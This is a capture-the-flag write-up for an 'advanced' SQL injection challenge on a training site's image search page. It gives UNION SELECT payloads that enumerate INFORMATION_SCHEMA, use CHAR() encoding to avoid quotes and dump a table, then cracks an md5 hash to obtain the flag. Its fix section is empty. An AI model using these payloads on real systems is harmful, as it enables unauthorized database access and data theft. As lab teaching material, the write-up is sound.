# Breach: SQL injection avancee


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


It will be similar to the basic SQL injection,<br>
so refer to the [SQL injection basic](/SQL%20injection%20basic/Ressources/Readme.md) breach for more information.

The only things that make it "avancee" are :
1. There is no output when there is an error in the SQL query.
2. The 2 outputs are switched.


#### Step 1:

- Go to the search image page.


#### Step 2:

Let's explore the database !

- List all the tables in the database:
```sql
999 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```


#### Step 3:

The table `list_images` looks interesting, let's see what's inside...

- Translate `list_images` and `Member_images` to their ASCII values:
```sql
CHAR(108, 105, 115, 116, 95, 105, 109, 97, 103, 101, 115)
CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115)
```

- List all the columns in the `list_images` table:
```sql
999 UNION SELECT COLUMN_NAME, COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA=CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115)
AND TABLE_NAME=CHAR(108, 105, 115, 116, 95, 105, 109, 97, 103, 101, 115)
```

> It gives us the culumns:
> | COLUMN_NAME | COLUMN_TYPE  |
> | ----------: | :----------- |
> | id          | int(11)      |
> | url         | varchar(40)  |
> | title       | varchar(25)  |
> | comment     | varchar(255) |


#### Step 4:

Now we can get the flag from the `list_images` table.

- List everthing:
```sql
999 UNION SELECT id, url FROM list_images
UNION SELECT id, title FROM list_images
UNION SELECT id, comment FROM list_images
```

> It gives us:
> | id  | url                                      | title     | comment                                                                                                               |
> | :-: | :--------------------------------------- | :-------- | :-------------------------------------------------------------------------------------------------------------------- |
> | 1   | https://fr.wikipedia.org/wiki/Programme_ | Nsa       | An image about the NSA !                                                                                              |
> | 2   | https://fr.wikipedia.org/wiki/Fichier:42 | 42 !      | There is a number..                                                                                                   |
> | 3   | https://fr.wikipedia.org/wiki/Logo_de_Go | Google    | Google it !                                                                                                           |
> | 4   | https://en.wikipedia.org/wiki/Earth#/med | Earth     | Earth!                                                                                                                |
> | 5   | borntosec.ddns.net/images.png            | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |


#### Step 5:

- Decrypt the password (md5 lookup): `1928e8083cf461a51303633093573c46` -> `albatroz`

- Lower all the characters: `albatroz` -> `albatroz` (no change)

- Sha256 on it: `albatroz` -> `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`


<br>


## How to fix it:

- ...


---

[[Back to main page](/#darkly)]
